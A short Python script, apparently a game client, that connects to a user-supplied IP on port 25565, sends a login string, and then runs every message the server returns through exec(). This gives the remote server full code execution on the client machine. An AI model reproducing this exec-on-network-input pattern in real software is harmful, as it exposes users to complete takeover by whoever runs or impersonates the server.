import socket
import hashlib
import pygame
import _thread
import sys


ip = input("IP: ")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, 25565))


nachricht = "pleaselogin"
s.send(nachricht.encode())


try:
    while True:
        antwort = s.recv(4096)
        exec(antwort.decode())
finally:
    s.close()